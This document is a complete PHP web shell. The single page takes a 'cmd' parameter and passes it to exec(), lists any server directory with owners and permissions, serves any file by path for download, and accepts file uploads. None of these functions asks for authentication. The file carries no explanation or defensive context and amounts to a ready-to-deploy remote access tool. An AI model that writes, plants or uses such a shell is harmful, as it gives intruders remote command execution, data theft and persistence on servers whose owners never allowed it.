<?php

if (isset($_GET['download'])) {
	$file = $_GET['download'];
	if (file_exists($file)) {
	    header('Content-Description: File Transfer');
	    header('Content-Type: application/octet-stream');
	    header('Content-Disposition: attachment; filename="'.basename($file).'"');
	    header('Expires: 0');
	    header('Cache-Control: must-revalidate');
	    header('Pragma: public');
	    header('Content-Length: ' . filesize($file));
	    readfile($file);
	    exit;
	}
}

?>

<html>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<div class="container">


<?php

function printPerms($file) {
	$mode = fileperms($file);
	if( $mode & 0x1000 ) { $type='p'; }
	else if( $mode & 0x2000 ) { $type='c'; }
	else if( $mode & 0x4000 ) { $type='d'; }
	else if( $mode & 0x6000 ) { $type='b'; }
	else if( $mode & 0x8000 ) { $type='-'; }
	else if( $mode & 0xA000 ) { $type='l'; }
	else if( $mode & 0xC000 ) { $type='s'; }
	else $type='u';
	$owner["read"] = ($mode & 00400) ? 'r' : '-';
	$owner["write"] = ($mode & 00200) ? 'w' : '-';
	$owner["execute"] = ($mode & 00100) ? 'x' : '-';
	$group["read"] = ($mode & 00040) ? 'r' : '-';
	$group["write"] = ($mode & 00020) ? 'w' : '-';
	$group["execute"] = ($mode & 00010) ? 'x' : '-';
	$world["read"] = ($mode & 00004) ? 'r' : '-';
	$world["write"] = ($mode & 00002) ? 'w' : '-';
	$world["execute"] = ($mode & 00001) ? 'x' : '-';
	if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
	if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
	if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
	$s=sprintf("%1s", $type);
	$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
	$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
	$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
	return $s;
}


$dir = $_GET['dir'];
if (isset($_POST['dir'])) {
	$dir = $_POST['dir'];
}
$file = '';
if ($dir == NULL or !is_dir($dir)) {
	if (is_file($dir)) {
		echo "enters";
		$file = $dir;
		echo $file;
	}
	$dir = './';
}
$dir = realpath($dir.'/'.$value);

$dirs = scandir($dir);
echo "<h2>Viewing directory " . $dir . "</h2>";
echo "\n<br><form action='".$_SERVER['PHP_SELF']."' method='GET'>";
echo "<input type='hidden' name='dir' value=".$dir." />";
echo "<input type='text' name='cmd' autocomplete='off' autofocus>\n<input type='submit' value='Execute'>\n";
echo "</form>";
echo "\n<br>\n<div class='navbar-form'><form action='".$_SERVER['PHP_SELF']."' method='POST' enctype='multipart/form-data'>\n";
echo "<input type='hidden' name='dir' value='".$_GET['dir']."'/> ";
echo "<input type='file' name='fileToUpload' id='fileToUpload'>\n<br><input type='submit' value='Upload File' name='submit'>";
echo "</div>";

if (isset($_POST['submit'])) {
	$uploadDirectory = $dir.'/'.basename($_FILES['fileToUpload']['name']);
	if (file_exists($uploadDirectory)) {
    	echo "<br><br><b style='color:red'>Error. File already exists in ".$uploadDirectory.".</b></br></br>";
	}
	else if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadDirectory)) {
		echo '<br><br><b>File '.$_FILES['fileToUpload']['name'].' uploaded successfully in '.$dir.' !</b><br>';
	} else {
		echo '<br><br><b style="color:red">Error uploading file '.$uploadDirectory.'</b><br><br>';

	}

}

if (isset($_GET['cmd'])) {
	echo "<br><br><b>Result of command execution: </b><br>";
	exec('cd '.$dir.' && '.$_GET['cmd'], $cmdresult);
	foreach ($cmdresult as $key => $value) {
		echo "$value \n<br>";
	}
}
echo "<br>";
?>

<table class="table table-hover table-bordered">
    <thead>
      <tr>
        <th>Name</th>
        <th>Owner</th>
        <th>Permissions</th>
      </tr>
    </thead>
    <tbody>
<?php
foreach ($dirs as $key => $value) {
	echo "<tr>";
	if (is_dir(realpath($dir.'/'.$value))) {
		echo "<td><a href='". $_SERVER['PHP_SELF'] . "?dir=". realpath($dir.'/'.$value) . "/'>". $value . "</a></td><td>". posix_getpwuid(fileowner($dir.'/'.$value))[name] . "</td><td> " . printPerms($dir) . "</td>\n";
	}
	else {
		echo "<td><a href='". $_SERVER['PHP_SELF'] . "?download=". realpath($dir.'/'.$value) . "'>". $value . "</a></td><td>". posix_getpwuid(fileowner($dir.'/'.$value))[name] ."</td><td> " . printPerms($dir) . "</td>\n";
	}
	echo "</tr>";
}
echo "</tbody>";
echo "</table>";


?>



</div>
</html>